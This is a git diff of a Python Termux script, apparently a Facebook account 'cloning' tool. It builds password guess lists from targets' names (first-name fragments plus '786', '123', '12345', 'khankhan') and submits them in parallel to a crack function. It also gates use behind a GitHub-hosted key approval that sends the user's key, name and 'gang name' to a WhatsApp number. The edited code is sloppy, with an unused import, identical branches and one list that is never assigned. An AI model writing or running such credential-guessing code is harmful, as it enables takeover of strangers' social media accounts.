@@ -6,6 +6,7 @@ B = '\033[94;1m'
 C = '\033[96;1m'
 N = '\x1b[0m'
 import os
+from webbrowser import Elinks
 try:
 	import requests
 except ImportError:
@@ -271,11 +272,15 @@ def name():
 		for yuzong in id2:
 			try:
 				idf,nmf = yuzong.split('|')
-				xz = nmf.split(' ')
-				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+				frist,last = nmf.split(' ')[0],nmf.split(' ')[1]
+				if len(frist)>=6:
+					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+				elif len(frist)<=2:
+					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+				elif len(frist)<=3:
+					pwv = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
 				else:
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+					[ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
 				elif 'free' in method:
@@ -291,18 +296,15 @@ def name2():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
-			pwv = []
 			if len(nmf):
-				if len(first+last)<6:
-					pass
+				if len(first+last)>=6:
+					pwv = [ nmf ]
+				elif len(first)<=2:
+					pwv = [ nmf ]
+				elif len(first)<=3:
+					pwv = [ nmf ]
 				else:
-					pwv.append(first+ last)
-			else:
-				if len(first+last<6):
-					pwv.append(first+last+'12')
-					pwv.append(first+last+'786')
-				else:
-					pwv.append(nmf)
+					pwv = [ nmf ]
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -426,34 +428,6 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		os.system("clear")
-		print(logo)
-		print("")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")	
-		
-		print("")
-		print("\033[1;37m [1] FIRST LIKE PAGE   ")
-		print("\033[1;37m [2] EXIT")
-		print("")
-		baloch = input("\n\033[1;37m  Choose : \033[1;32m")
-		if baloch in ["", " "]:
-			exit()
-		elif baloch in ["2", "02"]:
-			print("    THANK U")
-			exit() 
-		elif baloch in ["1", "01"]:
-			os.system("xdg-open https://m.facebook.com/khdxrsubrand/ ")
-			print("")
-			time.sleep(3.0)
-			print("\033[1;37m    CHEKING APROVAL ")
-			print("")
-			input("\n\033[1;37m Type PAGE Name \033[1;37m")
-			time.sleep(3.1)
-			print("")
-			print("\033[1;32m ASLAM O ALIKUM")
-			time.sleep(3.0)
-			os.system("clear")
 		print(logo)
 		print(" [+]CLONING MENU")
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
@@ -907,45 +881,75 @@ class Main:
 				continue
  
 		self.loop +=1
- 
-if len(sys.argv) == 2:
-	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
-		helpnote()
-	else:
-		Main()
- 
-try:Main()
-except Exception as e:exit(str(e))
+
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+
+	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH-cov', 'r').read()
+
 	clear()
+
 	print(logo)
+
 	r1=requests.get("https://raw.githubusercontent.com/khdfounder/khdxrsu/main/aproval.txt").text
+
 	if key1 in r1:
+
 		os.system('clear')
+
 		print(logo)
+
 		Main()
+
 	else:
+
 		os.system("clear")
+
 		print(logo)
+
 		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+
 		time.sleep(1)
+
 		os.system("clear")
+
 		print(logo)
+
 		print ("")
-		print(" \033[1;32m AHAD Toll Paid You Need Get Approved First\033[1;37m\n")
+
+		print(" \033[1;32m THIS JUST FOR RSU AND RSU FRIEDNS\033[1;37m\n")
+
 		print ("")
+
 		print(" Your Key is Not Approved ")
+
 		print("")
+
 		print(" Copy And Send Key To Admin")
+
 		print ("")
-		print (" Your Key : "+ak+KHD302+key1)
+
+		print (" Your Key : "+ak+ah+key1 )
+
 		print ("")
+
 		name = input(" Your Name : ")
+
 		print ("")
+
+		lol = input(" GANG NAME : ")
+
+		print ("")
+
 		input(" Press Enter To Send Key")
+
 		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+923185778830?text=' + tks)
-		Subscraption()        
-Main()
+
+		tks = 'Dear%20Sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20GANG%20NAME%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
+
+		os.system('am start https://wa.me/+923317415291?text=' + tks)
+
+		Subscraption() 
+
+	
+
+Subscraption()
